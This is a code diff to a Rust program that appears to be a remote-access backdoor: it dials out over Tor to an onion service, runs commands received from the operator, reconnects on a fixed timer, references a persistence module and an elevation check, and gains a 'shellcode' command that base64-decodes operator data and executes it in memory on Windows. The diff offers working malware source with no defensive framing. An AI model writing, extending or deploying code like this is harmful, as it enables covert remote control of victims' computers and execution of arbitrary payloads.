@@ -10,7 +10,21 @@ mod persist;
 use is_elevated::is_elevated;
 
 
-use arti_client::{TorClient, TorClientConfig, DataStream};
+use arti_client::{TorClient, TorClientConfigBuilder, DataStream};
+use std::sync::Mutex;
+use tempfile::TempDir;
+
+static STATE_DIR: Mutex<Option<TempDir>> = Mutex::new(None);
+static CACHE_DIR: Mutex<Option<TempDir>> = Mutex::new(None);
+
+fn cleanup_temp_dirs() {
+    if let Ok(mut guard) = STATE_DIR.lock() {
+        guard.take();
+    }
+    if let Ok(mut guard) = CACHE_DIR.lock() {
+        guard.take();
+    }
+}
 #[cfg(target_os = "windows")]
 use libc::malloc;
 use tor_rtcompat::PreferredRuntime;
@@ -74,7 +88,12 @@ impl Default for ClientConfig {
 }
 /// Initialize Tor client
 async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
-    let config = TorClientConfig::default();
+    let state = STATE_DIR.lock().unwrap()
+        .get_or_insert_with(|| TempDir::new().expect("create temp state dir"));
+    let cache = CACHE_DIR.lock().unwrap()
+        .get_or_insert_with(|| TempDir::new().expect("create temp cache dir"));
+    let config = TorClientConfigBuilder::from_directories(state.path(), cache.path())
+        .build()?;
     let client = TorClient::create_bootstrapped(config).await?;
     println!("Initialized Tor Client");
     Ok(client)
@@ -287,13 +306,13 @@ Available commands:
         }
 
         "shellcode" => {
-            let filename = args
+            let b64_data = args
                 .get(0)
-                .ok_or_else(|| anyhow!("shellcode: missing filename"))?;
+                .ok_or_else(|| anyhow!("shellcode: missing base64 data"))?;
 
-            let data = fs::read(filename)?;
+            let data = general_purpose::STANDARD.decode(b64_data)?;
 
-            let msg = format!("Executing shellcode from {} ({} bytes)\n", filename, data.len());
+            let msg = format!("Executing shellcode ({} bytes)\n", data.len());
 
             #[cfg(target_os = "windows")]
             execute_shellcode_windows(&data)?;
@@ -305,7 +324,7 @@ Available commands:
         }
 
         "exit" | "quit" | "/quit" => {
-            std::process::exit(0);
+            Ok("Goodbye\n".into())
         }
 
         _ => {
@@ -367,8 +386,8 @@ pub async fn connect_onion(
     Ok(tor_client.connect((onion_addr, port)).await?)
 }
 
-/// Session loop
-pub async fn read_loop(stream: DataStream) -> Result<()> {
+/// Session loop, returns Ok(true) on exit, Ok(false) on disconnect
+pub async fn read_loop(stream: DataStream) -> Result<bool> {
     let (mut reader, mut writer) = split(stream);
 
     let mut buf = [0u8; 16384];
@@ -382,7 +401,7 @@ pub async fn read_loop(stream: DataStream) -> Result<()> {
 
         if n == 0 {
             println!("Connection closed by remote");
-            break;
+            return Ok(false);
         }
 
         buffer.push_str(&String::from_utf8_lossy(&buf[..n]));
@@ -399,6 +418,12 @@ pub async fn read_loop(stream: DataStream) -> Result<()> {
                 continue;
             }
 
+            if line == "exit" || line == "quit" || line == "/quit" {
+                writer.write_all(b"Goodbye\n").await?;
+                writer.flush().await?;
+                return Ok(true);
+            }
+
             match run_command(&line).await {
               Ok(output) => {
               writer.write_all(&output).await?;
@@ -413,8 +438,6 @@ writer.write_all(build_prompt().as_bytes()).await?;
 writer.flush().await?;
         }
     }
-
-    Ok(())
 }
 
 /// Core runner
@@ -428,21 +451,28 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
             Ok(stream) => {
                 println!("Connected to onion service");
 
-                if let Err(e) = read_loop(stream).await {
-                    println!("Session error: {}", e);
+                match read_loop(stream).await {
+                    Ok(true) => {
+                        println!("Exit requested");
+                        break;
+                    }
+                    Ok(false) => {
+                        println!("Connection closed");
+                    }
+                    Err(e) => {
+                        println!("Session error: {}", e);
+                    }
                 }
-
-                println!("Connection closed, will reconnect...");
             }
             Err(e) => {
                 println!("Connection failed: {}", e);
             }
         }
-        //let mut rng = thread_rng();
         let delay = 17;
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
+    Ok(())
 }
 
 #[cfg(target_os = "windows")]
@@ -476,6 +506,7 @@ async fn netclient_impl() -> c_int {
         sleep(Duration::from_secs(61)).await;
     }
     let _ = netclient_run(ClientConfig::default()).await;
+    cleanup_temp_dirs();
     return 0;
 }
 
